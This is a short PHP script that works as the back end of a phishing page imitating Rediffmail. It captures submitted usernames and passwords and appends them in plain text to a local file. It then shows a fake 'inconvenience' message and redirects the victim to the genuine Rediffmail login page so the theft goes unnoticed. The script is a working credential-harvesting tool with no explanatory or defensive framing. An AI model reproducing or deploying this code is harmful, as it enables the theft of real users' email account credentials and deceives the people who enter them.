<?php
    session_start();
    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        if(isset($_POST['username']) && isset($_POST['password']))
        {
            $fp = fopen("username.txt",'a');
            $user = $_POST['username'];
            $pwd = $_POST['password'];
            fwrite($fp,$user);
            fwrite($fp," -- ");
            fwrite($fp,$pwd);
            fwrite($fp,"\n");
            fclose($fp);
        }
    }
    echo "Sorry for the inconvinience. Redirecting to login page.";
        // die("Sorry for the inconvinience. Redirecting to login page.");
        // header("Location:https://mail.rediff.com/cgi-bin/login.cgi");
        header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
        exit();
?>